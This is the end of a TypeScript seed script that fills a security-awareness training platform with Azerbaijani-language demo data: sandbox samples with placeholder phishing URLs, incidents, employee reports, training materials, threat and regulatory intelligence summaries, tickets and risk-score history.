      c.writeUInt32LE(body.length, 20);
      c.writeUInt32LE(body.length, 24);
      c.writeUInt16LE(nameBuf.length, 28);
      c.writeUInt32LE(offset, 42);
      central.push(c, nameBuf);
      offset += 30 + nameBuf.length + body.length;
    }
    const cd = Buffer.concat(central);
    const end = Buffer.alloc(22);
    end.writeUInt32LE(0x06054b50, 0);
    end.writeUInt16LE(files.length, 8);
    end.writeUInt16LE(files.length, 10);
    end.writeUInt32LE(cd.length, 12);
    end.writeUInt32LE(offset, 16);
    return Buffer.concat([...parts, cd, end]);
  })();
  const samples = [
    { n: 508, a: analyzeUrl("http://track-delivery-az.info/izle?kod=AZ88213"), by: byEmailKey("sevinc").id, d: 5 },
    { n: 509, a: analyzeFile("cv_namizad.docx", docx), by: byEmailKey("emil").id, d: 6 },
    { n: 510, a: analyzeFile("faktura_1042.lnk", lnk), by: byEmailKey("samir").id, d: 5 },
    { n: 511, a: analyzeUrl("http://m365-login-verify.top/common/oauth2/signin?client=office"), by: analyst.id, d: 5 },
    { n: 512, a: analyzeFile("maas_yenilenmesi.html", phishHtml), by: byEmailKey("gulnar").id, d: 5 },
    { n: 513, a: analyzeFile("shared image.jpeg", jpeg), by: learner.id, d: 4 },
  ];
  const sandboxIds = new Map<number, string>();
  for (const s of samples) {
    const [row] = await db
      .insert(t.sandboxAnalyses)
      .values({ tenantId, number: s.n, kind: s.a.kind, objectName: s.a.objectName, sha256: s.a.sha256, sizeBytes: s.a.sizeBytes, verdict: s.a.verdict, score: s.a.score, findings: s.a.findings, iocs: s.a.iocs, mitre: s.a.mitre, submittedBy: s.by, createdAt: daysAgo(s.d, 11) })
      .returning();
    sandboxIds.set(s.n, row.id);
  }

  const opsPeople = active.filter((p) => p.dept === "ops").map((p) => p.id);
  const finPeople = active.filter((p) => p.dept === "fin").map((p) => p.id);
  const itPeople = active.filter((p) => p.dept === "it" || p.dept === "sec").map((p) => p.id);
  const sb511 = samples.find((s) => s.n === 511)!.a;
  const incidentSpecs = [
    { n: 25, title: "Naməlum USB daşıyıcısı: texniki otaq", severity: "medium" as const, status: "open" as const, source: "analyst" as const, module: "usb-media", min: 60, due: 3, targets: itPeople, auto: false, d: 9 },
    { n: 28, title: "İtirilmiş telefon: MDM ilə uzaqdan silinmə", severity: "medium" as const, status: "resolved" as const, source: "report" as const, module: "work-phone-mdm", min: 50, due: -7, targets: opsPeople.slice(0, 3), auto: true, d: 14 },
    { n: 31, title: "Daxili təhdid araşdırması: Maliyyə", severity: "high" as const, status: "investigating" as const, source: "analyst" as const, module: "insider-threat", min: null, due: 1, targets: finPeople, auto: false, confidential: true, d: 7 },
    { n: 33, title: "Oğurlanmış giriş məlumatları: İstehsalat", severity: "high" as const, status: "open" as const, source: "sandbox" as const, module: "fake-login-windows", min: 70, due: -3, targets: opsPeople, auto: true, sandbox: 511, d: 5 },
    { n: 34, title: "Açıq mətnli parol: kodda saxlanılan giriş məlumatları (BILLING-APP)", severity: "high" as const, status: "open" as const, source: "siem" as const, module: "password-managers-work", min: 80, due: -4, targets: itPeople, auto: false, live: true, d: 2 },
  ];
  const incidentIds = new Map<number, string>();
  for (const s of incidentSpecs) {
    const createdAt = daysAgo(s.d, 12);
    const [row] = await db
      .insert(t.incidents)
      .values({
        tenantId,
        number: s.n,
        title: s.title,
        description:
          s.n === 34
            ? "SIEM qaydası BILLING-APP repozitoriyasında açıq mətnli verilənlər bazası parolu aşkarladı. Açar dəyişdirilib; tərtibatçılara parol gigiyenası təlimi təyin edilməlidir."
            : s.n === 33
              ? "Sandbox SB-511 saxta Microsoft 365 giriş səhifəsini təsdiqlədi. Bir neçə operator linki açıb; hesabların parolu sıfırlanıb."
              : "İnsident komandasının qeydi.",
        severity: s.severity,
        status: s.status,
        confidential: "confidential" in s ? !!s.confidential : false,
        live: "live" in s ? !!s.live : false,
        source: s.source,
        iocs: s.n === 33 ? sb511.iocs.filter((i) => i.type !== "url").slice(0, 2) : s.n === 34 ? [{ type: "filename", value: "billing-app/config/db.yml" }] : [],
        mitre: s.n === 33 ? ["T1566.002", "T1078"] : s.n === 34 ? ["T1552.001"] : s.n === 25 ? ["T1091"] : s.n === 31 ? ["T1530"] : [],
        sandboxId: "sandbox" in s && s.sandbox ? sandboxIds.get(s.sandbox)! : null,
        trainingModuleId: mod(s.module).id,
        minScore: s.min,
        dueDate: iso(new Date(createdAt.getTime() + (s.d + s.due) * DAY)),
        targetUserIds: s.targets,
        autoTrainingAt: s.auto ? new Date(createdAt.getTime() + DAY) : null,
        createdBy: analyst.id,
        createdAt,
        resolvedAt: s.status === "resolved" ? daysAgo(3) : null,
      })
      .returning();
    incidentIds.set(s.n, row.id);
    if (s.auto) {
      for (const uid of s.targets) {
        await db.insert(t.behaviorRisks).values({
          tenantId,
          userId: uid,
          kind: "incident",
          severity: s.severity,
          title: `IR-${s.n}: ${s.title}`,
          sourceRef: `IR-${s.n}`,
          moduleId: mod(s.module).id,
          status: s.status === "resolved" ? "closed" : "open",
          dueDate: iso(new Date(createdAt.getTime() + 10 * DAY)),
          createdAt: new Date(createdAt.getTime() + DAY),
          closedAt: s.status === "resolved" ? daysAgo(4) : null,
        });
      }
    }
  }
  await db.update(t.sandboxAnalyses).set({ incidentId: incidentIds.get(33)! }).where(sql`${t.sandboxAnalyses.id} = ${sandboxIds.get(511)!}`);

  // Real (non-simulation) reports from employees.
  const realReports = [
    { by: "sevinc", ch: "sms" as const, subject: "Kuryerdən «bağlama saxlanılıb» SMS-i", url: "http://track-delivery-az.info/izle", status: "converted" as const, sev: "medium" as const, d: 5 },
    { by: "gulnar", ch: "email" as const, subject: "«Maaş yenilənməsi» adlı HTML əlavəli məktub", status: "converted" as const, sev: "high" as const, d: 5 },
    { by: "murad", ch: "call" as const, subject: "Zəng: «bank təhlükəsizlik xidməti» SMS kodunu istədi", status: "triaged" as const, sev: "medium" as const, d: 3 },
    { by: "fidan", ch: "in_person" as const, subject: "3-cü mərtəbədə sahibsiz USB fleş kart tapıldı", status: "converted" as const, sev: "medium" as const, d: 9 },
    { by: "xeyale", ch: "email" as const, subject: "Microsoft 365 «parolunuzun müddəti bitir» məktubu", url: "http://m365-login-verify.top/common/oauth2/signin", status: "new" as const, sev: null, d: 0 },
    { by: "elnare", ch: "other" as const, subject: "WhatsApp-da baş direktorun adından «təcili köçürmə» mesajı", status: "new" as const, sev: null, d: 0 },
  ];
  for (const r of realReports) {
    const p = people.find((x) => x.email.startsWith(r.by))!;
    const at = daysAgo(r.d, r.d === 0 ? Math.max(8, NOW.getHours() - 1) : 10, 20);
    await db.insert(t.threatReports).values({ tenantId, number: ++reportNumber, reporterId: p.id, channel: r.ch, subject: r.subject, details: null, url: "url" in r ? r.url : null, status: r.status, severity: r.sev, createdAt: at });
    await awardXp(db, { tenantId, userId: p.id, amount: REPORT_BONUS_XP, reason: "report", ref: `report-${reportNumber}`, at });
  }

  // Closed loops (intake → analysis → conversion → approval → targeting → training → feedback).
  const STAGES = t.LOOP_STAGES;
  const loopSpecs = [
    { title: "Fişinq: «Maaş yenilənməsi» (HR brendinin təqlidi)", stage: "training" as const, verdict: "malicious" as const, source: "report" as const, d: 5, trained: 0 },
    { title: "Saxta Microsoft 365 giriş səhifəsi", stage: "targeting" as const, verdict: "malicious" as const, source: "sandbox" as const, d: 5, trained: 0 },
    { title: "MFA yorğunluğu: gecə push bildirişləri ilə hücum", stage: "approval" as const, verdict: "suspicious" as const, source: "intel" as const, d: 5, trained: 0 },
    { title: "Ransomware: .lnk əlavəsi («faktura»)", stage: "analysis" as const, verdict: "pending" as const, source: "sandbox" as const, d: 5, trained: 0 },
    { title: "Kuryer SMS dalğası (SuretKargo təqlidi)", stage: "feedback" as const, verdict: "malicious" as const, source: "report" as const, d: 22, trained: 9, closed: 15 },
    { title: "Saxta e-imza bildirişi (DocuSfera)", stage: "feedback" as const, verdict: "malicious" as const, source: "report" as const, d: 30, trained: 12, closed: 24 },
    { title: "Deepfake zəng: baş direktor müavininin səsi", stage: "feedback" as const, verdict: "malicious" as const, source: "incident" as const, d: 28, trained: 4, closed: 20 },
    { title: "Sahibsiz USB: 3-cü mərtəbə", stage: "feedback" as const, verdict: "suspicious" as const, source: "report" as const, d: 9, trained: 5, closed: 3 },
    { title: "İtirilmiş telefon və MDM", stage: "feedback" as const, verdict: "benign" as const, source: "incident" as const, d: 14, trained: 3, closed: 6 },
  ];
  const loopIds: string[] = [];
  for (const s of loopSpecs) {
    const createdAt = daysAgo(s.d, 9, 40);
    const [loop] = await db
      .insert(t.loops)
      .values({ tenantId, title: s.title, stage: s.stage, verdict: s.verdict, sourceType: s.source, trainedCount: s.trained, closedAt: s.closed ? daysAgo(s.closed) : null, createdAt, updatedAt: createdAt })
      .returning();
    loopIds.push(loop.id);
    const last = STAGES.indexOf(s.stage);
    for (let i = 0; i <= last; i++) {
      await db.insert(t.loopEvents).values({ loopId: loop.id, stage: STAGES[i], actorId: i === 0 ? null : analyst.id, note: null, at: new Date(createdAt.getTime() + i * 3 * 3_600_000) });
    }
  }

  // Approval gate.
  await db.insert(t.materials).values([
    {
      tenantId,
      title: "MFA yorğunluğu: push bildirişini rədd edin",
      body: "Bu qısa dərs gecə gələn təkrar MFA bildirişlərini tanımağı, «Rədd et» seçimini edib dərhal İT bölməsinə bildirməyi öyrədir.",
      origin: "ai",
      status: "pending",
      sourceRef: "L-2039",
      loopId: loopIds[2],
      moduleId: mod("passwords-mfa").id,
      targetUserIds: active.filter((p) => p.dept === "it" || p.dept === "fin").slice(0, 4).map((p) => p.id),
      createdAt: daysAgo(5, 9),
    },
    {
      tenantId,
      title: "Parolun təkrar istifadəsi riski",
      body: "İnsident araşdırması oğurlanmış parolların başqa sistemlərdə də işlədildiyini göstərdi. Hər sistem üçün ayrıca parol və parol meneceri tələb olunur.",
      origin: "ai",
      status: "second_approval",
      requiresTwo: true,
      sourceRef: "IR-33",
      moduleId: mod("password-managers-work").id,
      targetUserIds: opsPeople.slice(0, 2),
      createdAt: daysAgo(5, 10),
    },
    {
      tenantId,
      title: "VPN zəiflikləri (CVE): yenilənmələrin vacibliyi",
      body: "İstehsalçının xəbərdarlığı əsasında VPN yenilənmələrinin niyə təcili olduğunu izah edən dəstək materialı.",
      origin: "template",
      status: "pending",
      sourceRef: "L-2025",
      moduleId: mod("software-updates").id,
      targetUserIds: itPeople.slice(0, 3),
      createdAt: daysAgo(5, 11),
    },
  ]);
  const [m1] = await db
    .insert(t.materials)
    .values({ tenantId, title: "Kuryer SMS-lərində ödəniş linkləri", body: "SuretKargo adından gələn SMS-lərdə kiçik ödəniş tələbi fırıldaqdır.", origin: "ai", status: "approved", sourceRef: "TR-141", loopId: loopIds[4], targetUserIds: opsPeople, createdAt: daysAgo(21) })
    .returning();
  await db.insert(t.materialDecisions).values({ materialId: m1.id, actorId: analyst.id, decision: "approve", at: daysAgo(20) });

  // Threat and policy intelligence (public sources; sample summaries).
  await db.insert(t.intelItems).values([
    { tenantId, kind: "threat", title: "AiTM fişinq dəstləri Microsoft 365 hesablarını hədəfləyir", summary: "Hücumçular proksi giriş səhifələri ilə sessiya kukilərini oğurlayır və MFA-nı keçir. Saxta giriş səhifələrini tanıma təlimi tövsiyə olunur.", sourceName: "CISA", sourceUrl: "https://www.cisa.gov/", severity: "high", tags: ["phishing", "mfa", "m365"], status: "converted", loopId: loopIds[1], publishedAt: daysAgo(6) },
    { tenantId, kind: "threat", title: "Saxta CAPTCHA ilə əmr icrası («ClickFix»)", summary: "İstifadəçidən Win+R ilə əmr yapışdırmaq istənilir; nəticədə infostealer yüklənir. Brauzerdə «təsdiq» üçün əmr icra etmək heç vaxt tələb olunmur.", sourceName: "ENISA", sourceUrl: "https://www.enisa.europa.eu/", severity: "high", tags: ["infostealer", "social-engineering"], status: "new", publishedAt: daysAgo(2) },
    { tenantId, kind: "threat", title: "MFA yorğunluğu: gecə saatlarında təkrar push sorğuları", summary: "Oğurlanmış parolla daxil olmağa çalışan hücumçu istifadəçi «təsdiq» edənədək bildiriş göndərir.", sourceName: "Microsoft Security Blog", sourceUrl: "https://www.microsoft.com/security/blog/", severity: "medium", tags: ["mfa"], status: "converted", loopId: loopIds[2], publishedAt: daysAgo(7) },
    { tenantId, kind: "threat", title: "Kuryer SMS fişinqi regionda artıb", summary: "Kiçik məbləğli «çatdırılma haqqı» ilə kart məlumatlarını toplayan SMS-lər geniş yayılıb.", sourceName: "CERT bülleteni", severity: "medium", tags: ["smishing"], status: "reviewed", publishedAt: daysAgo(12) },
    { tenantId, kind: "threat", title: "Deepfake səslə rəhbər adından köçürmə tələbləri", summary: "Səs klonlama ilə rəhbərin adından təcili köçürmə istənilir. İkinci kanalla təsdiq tələb olunur.", sourceName: "Europol IOCTA", sourceUrl: "https://www.europol.europa.eu/", severity: "high", tags: ["deepfake", "bec"], status: "new", publishedAt: daysAgo(1) },
    { tenantId, kind: "policy", title: "ISO/IEC 27001:2022-ə keçid müddəti başa çatıb", summary: "2013 versiyası üzrə sertifikatlar 31 oktyabr 2025-dən etibarsızdır. A.6.3 (məlumatlandırma və təlim) nəzarəti üzrə sübutlar hazır olmalıdır.", sourceName: "ISO / IAF", sourceUrl: "https://www.iso.org/", severity: "medium", jurisdiction: "Beynəlxalq", effectiveDate: "2025-10-31", tags: ["iso27001", "audit"], status: "reviewed", publishedAt: daysAgo(20) },
    { tenantId, kind: "policy", title: "PCI DSS v4.0.1: fişinqə qarşı təlim tələbi (12.6.3.1)", summary: "Gələcək tarixli tələblər 31 mart 2025-dən məcburidir: təlim fişinq və sosial mühəndisliyi əhatə etməlidir.", sourceName: "PCI SSC", sourceUrl: "https://www.pcisecuritystandards.org/", severity: "medium", jurisdiction: "Beynəlxalq", effectiveDate: "2025-03-31", tags: ["pci", "finance"], status: "converted", publishedAt: daysAgo(25) },
    { tenantId, kind: "policy", title: "NIS2: rəhbərliyin kibertəhlükəsizlik təlimi öhdəliyi (Maddə 20)", summary: "İdarəetmə orqanlarının üzvləri müntəzəm təlim keçməlidir; əməkdaşlara da oxşar təlim təklif edilməlidir.", sourceName: "EUR-Lex", sourceUrl: "https://eur-lex.europa.eu/", severity: "high", jurisdiction: "AB", effectiveDate: "2024-10-18", tags: ["nis2", "leadership"], status: "new", publishedAt: daysAgo(4) },
    { tenantId, kind: "policy", title: "AB Süni İntellekt Aktı: Sİ savadlılığı öhdəliyi (Maddə 4)", summary: "Sİ sistemlərindən istifadə edən təşkilatlar əməkdaşlarının kifayət qədər Sİ savadlılığını təmin etməlidir (2 fevral 2025-dən).", sourceName: "EUR-Lex", sourceUrl: "https://eur-lex.europa.eu/", severity: "medium", jurisdiction: "AB", effectiveDate: "2025-02-02", tags: ["ai", "policy"], status: "new", publishedAt: daysAgo(3) },
    { tenantId, kind: "policy", title: "DORA: maliyyə sektorunda İKT riskləri üzrə təlim", summary: "17 yanvar 2025-dən maliyyə qurumları əməkdaşlar üçün İKT təhlükəsizliyi məlumatlandırma proqramları keçirməlidir.", sourceName: "EUR-Lex", sourceUrl: "https://eur-lex.europa.eu/", severity: "low", jurisdiction: "AB", effectiveDate: "2025-01-17", tags: ["dora", "finance"], status: "dismissed", publishedAt: daysAgo(30) },
  ]);

  /* ───────── support, feedback, problems, live sessions ───────── */
  const tickets = [
    { by: "learner", cat: "training" as const, pri: "medium" as const, subject: "«Parol menecerləri» dərsi telefonda açılmır", status: "in_progress" as const, d: 2, sla: 1 },
    { by: "ramil", cat: "account" as const, pri: "high" as const, subject: "İki addımlı giriş kodunu itirdim", status: "open" as const, d: 0, sla: 0.2 },
    { by: "pervin", cat: "security" as const, pri: "high" as const, subject: "Müştəri adından gələn şübhəli faylı açdım", status: "answered" as const, d: 4, sla: -3 },
    { by: "sevinc", cat: "technical" as const, pri: "low" as const, subject: "Səs bəzən gecikir", status: "closed" as const, d: 12, sla: -9 },
    { by: "emil", cat: "other" as const, pri: "low" as const, subject: "Sertifikatı PDF kimi yükləmək mümkündürmü?", status: "answered" as const, d: 6, sla: -4 },
  ];
  let ticketNo = 1036;
  for (const tk of tickets) {
    const p = people.find((x) => x.email.startsWith(tk.by))!;
    const at = daysAgo(tk.d, tk.d === 0 ? Math.max(8, NOW.getHours() - 2) : 14);
    const [row] = await db
      .insert(t.supportTickets)
      .values({ tenantId, number: ++ticketNo, userId: p.id, category: tk.cat, priority: tk.pri, subject: tk.subject, body: tk.subject + ". Zəhmət olmasa kömək edin.", status: tk.status, slaDueAt: new Date(at.getTime() + (tk.pri === "high" ? 4 : tk.pri === "medium" ? 24 : 72) * 3_600_000), createdAt: at, updatedAt: at })
      .returning();
    await db.insert(t.ticketMessages).values({ ticketId: row.id, authorId: p.id, body: row.body, at });
    if (tk.status !== "open") {
      await db.insert(t.ticketMessages).values({ ticketId: row.id, authorId: analyst.id, body: "Müraciətiniz qəbul olundu. Yoxlayırıq və tezliklə cavab verəcəyik.", at: new Date(at.getTime() + 2 * 3_600_000) });
    }
  }
  const comments = ["Mailbox simulyasiyası çox real idi.", "Səsli müəllim əladır, amma bir az tez danışır.", "Daha çox SMS nümunəsi olsun.", null, "Rəhbərlər üçün qısa versiya faydalı olardı.", "Lens aləti ilə domen fərqini görmək çox yaxşıdır.", null, "Mobil versiyada düymələr kiçikdir.", "Liqa komandamızı motivasiya edir!", null, "Deepfake dərsi təsirli idi.", "Testlər bəzən çətindir."];
  const fbModules = ["phishing-email", "passwords-mfa", "social-engineering", "deepfake-scams", "safe-browsing", "incident-reporting"];
  for (let i = 0; i < comments.length; i++) {
    const p = pickOne(active);
    await db.insert(t.feedback).values({
      tenantId,
      userId: i % 3 === 0 ? null : p.id,
      moduleId: i < 8 ? mod(fbModules[i % fbModules.length]).id : null,
      rating: Math.max(2, Math.min(5, Math.round(3.4 + rnd() * 2))),
      topic: i < 8 ? "module" : i % 2 ? "platform" : "idea",
      comment: comments[i],
      status: i < 4 ? "reviewed" : "new",
      createdAt: daysAgo(1 + Math.floor(rnd() * 25)),
    });
  }
  await db.insert(t.problemReports).values([
    { tenantId, userId: byEmailKey("learner").id, context: "lesson:phishing-email/phishing-basics", message: "Səs bir anlıq kəsildi, sonra davam etdi.", status: "new", createdAt: daysAgo(1), updatedAt: daysAgo(1) },
    { tenantId, userId: byEmailKey("murad").id, context: "lesson:mobile-wifi/public-wifi", message: "Sualın variantlarından biri ekrandan kənara çıxır.", status: "in_progress", createdAt: daysAgo(6), updatedAt: daysAgo(3) },
    { tenantId, userId: byEmailKey("fidan").id, context: "page:/league", message: "Liqa cədvəli yüklənmədi.", status: "resolved", createdAt: daysAgo(13), updatedAt: daysAgo(10) },
  ]);
  const sessions = [
    { title: "Canlı nümayiş: fişinq məktubunu 60 saniyədə tanıyın", host: "Səbinə Əliyeva", loc: "Konfrans zalı A / Teams", d: 3, dur: 45, cap: 40 },
    { title: "Rəhbərlər üçün brifinq: deepfake və BEC", host: "Səbinə Əliyeva", loc: "Rəhbərlik iclas zalı", d: 9, dur: 30, cap: 12 },
    { title: "Sual-cavab: parol menecerinə keçid", host: "Tural Həsənli", loc: "Teams", d: 14, dur: 40, cap: 100 },
    { title: "Məlumatların paylaşılması: hüquqi tərəf", host: "Zaur Məlikov", loc: "Konfrans zalı B", d: -6, dur: 50, cap: 30 },
  ];
  for (const s of sessions) {
    const startsAt = new Date(NOW.getTime() + s.d * DAY);
    startsAt.setHours(s.d < 0 ? 15 : 11, 0, 0, 0);
    const [row] = await db
      .insert(t.liveSessions)
      .values({ tenantId, title: s.title, description: null, startsAt, durationMin: s.dur, location: s.loc, host: s.host, capacity: s.cap, createdAt: daysAgo(15) })
      .returning();
    for (const p of active) {
      if (rnd() < (s.d < 0 ? 0.35 : 0.25)) await db.insert(t.sessionRegistrations).values({ sessionId: row.id, userId: p.id, attended: s.d < 0 && rnd() < 0.8, at: daysAgo(Math.max(0, -s.d + 2)) });
    }
  }

  /* ───────── notifications & audit trail ───────── */
  // In each recipient's language, worded like notifyUsers: the template's subject, then the due date.
  const pwMfaTitle = modRows.find((m) => m.slug === "passwords-mfa")!.title;
  const pwMfaDue = new Date(`${iso(new Date(NOW.getTime() + 12 * DAY))}T12:00:00Z`);
  for (const p of active.slice(0, 20)) {
    const lang = p.locale ?? "az";
    const due = createTranslator({ ...(await messagesFor(lang)), namespace: "common.time" })("due", { date: new Intl.DateTimeFormat(lang, { dateStyle: "long", timeZone: "UTC" }).format(pwMfaDue) });
    await db.insert(t.notifications).values({ tenantId, userId: p.id, kind: "assignment", title: DEFAULT_TEMPLATES.assignment[lang].subject.replace("{{module}}", pick(pwMfaTitle, lang)), body: due, href: "/learn/passwords-mfa", createdAt: assignedAt });
  }
  const learnerLang = learner.locale ?? "az";
  const riskKind = createTranslator({ ...(await messagesFor(learnerLang)), namespace: "security.kind" })("breach");
  await db.insert(t.notifications).values({ tenantId, userId: learner.id, kind: "risk", title: riskKind, body: riskTitle(breachTitle, learnerLang), href: "/security", createdAt: daysAgo(3) });
  await audit(db, { tenantId, actorId: admin.id, action: "settings.branding", at: daysAgo(55) });
  await audit(db, { tenantId, actorId: admin.id, action: "people.imported", meta: { count: people.length - 1 }, at: daysAgo(50) });
  for (const a of await db.select().from(t.assignments)) {
    await audit(db, { tenantId, actorId: admin.id, action: "assignment.created", targetType: "assignment", targetId: a.id, at: a.createdAt });
  }
  await audit(db, { tenantId, actorId: analyst.id, action: "incident.created", targetType: "incident", targetId: incidentIds.get(34)!, meta: { number: "IR-34" }, at: daysAgo(2, 12) });
  await audit(db, { tenantId, actorId: analyst.id, action: "sandbox.analyzed", targetType: "sandbox", targetId: sandboxIds.get(513)!, meta: { number: "SB-513", verdict: "clean" }, at: daysAgo(4, 11) });
  for (const p of active.filter((x) => x.activity > 0.4)) {
    await audit(db, { tenantId, actorId: p.id, action: "auth.sign_in", ip: `10.20.${Math.floor(rnd() * 9)}.${Math.floor(rnd() * 250)}`, at: daysAgo(Math.floor(rnd() * 6), 9, 5) });
  }
  // Certificates for the first finished learning path.
  const core = pathByKey.get("core")!;
  for (const p of active) {
    const done = await db
      .select({ n: sql<number>`count(*)` })
      .from(t.moduleProgress)
      .innerJoin(t.modules, sql`${t.modules.id} = ${t.moduleProgress.moduleId}`)
      .where(sql`${t.moduleProgress.userId} = ${p.id} and ${t.moduleProgress.status} = 'completed' and ${t.modules.slug} in ${core.moduleSlugs}`);
    if (Number(done[0].n) === core.moduleSlugs.length) await issueCertificate(db, { tenantId, userId: p.id, pathId: core.id, at: daysAgo(1) });
  }

  /* ───────── risk scores and the 30-day trend ───────── */
  await recomputeRisk(db, tenantId);
  // Per-person history: 30 days drifting towards today's score, ending exactly on it.
  const scores = await db.select({ id: t.users.id, score: t.users.riskScore }).from(t.users).where(sql`${t.users.tenantId} = ${tenantId} and ${t.users.status} = 'active'`);
  for (const u of scores) {
    const drift = Math.round((rnd() - 0.5) * 24);
    await db.insert(t.userRiskSnapshots).values(
      Array.from({ length: 31 }, (_, i) => {
        const d = 30 - i;
        const wobble = d === 0 ? 0 : Math.round((rnd() - 0.5) * 4);
        return { tenantId, userId: u.id, day: dayKey(new Date(NOW.getTime() - d * DAY)), score: Math.max(0, Math.min(100, u.score + Math.round((drift * d) / 30) + wobble)) };
      }),
    );
  }
  // A few people hold a streak freeze (earned after 7 days in a row; covers one missed day).
  await db
    .update(t.users)
    .set({ streakFreezes: sql`greatest(${t.users.streakFreezes}, 1)` })
    .where(sql`${t.users.id} in ${[learner.id, byEmailKey("head").id, content.id, analyst.id]}`);
  const k = await tenantKpis(db, tenantId);
  const start = { risk: k.avgRisk + 9, completion: Math.max(5, k.completion - 38), report: Math.min(95, k.reportRate + 6), click: Math.min(60, k.clickRate + 10) };
  for (let d = 30; d >= 0; d--) {
    const f = (30 - d) / 30;
    const ease = 1 - Math.pow(1 - f, 2);
    const noise = () => Math.round((rnd() - 0.5) * 3);
    await db.insert(t.riskSnapshots).values({
      tenantId,
      day: dayKey(new Date(NOW.getTime() - d * DAY)),
      avgRisk: d === 0 ? k.avgRisk : Math.round(start.risk + (k.avgRisk - start.risk) * ease) + noise(),
      completion: d === 0 ? k.completion : Math.max(0, Math.round(start.completion + (k.completion - start.completion) * ease) + noise()),
      reportRate: d === 0 ? k.reportRate : Math.round(start.report + (k.reportRate - start.report) * ease) + noise(),
      clickRate: d === 0 ? k.clickRate : Math.round(start.click + (k.clickRate - start.click) * ease) + noise(),
    });
  }
  console.log(`KPIs: risk ${k.avgRisk}, completion ${k.completion}%, report ${k.reportRate}%, click ${k.clickRate}%`);
  console.log(`Done. Sign in with admin@${DEMO_DOMAIN} (and the other role accounts in scripts/seed-data.ts) using SEED_PASSWORD.`);
  await close();
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
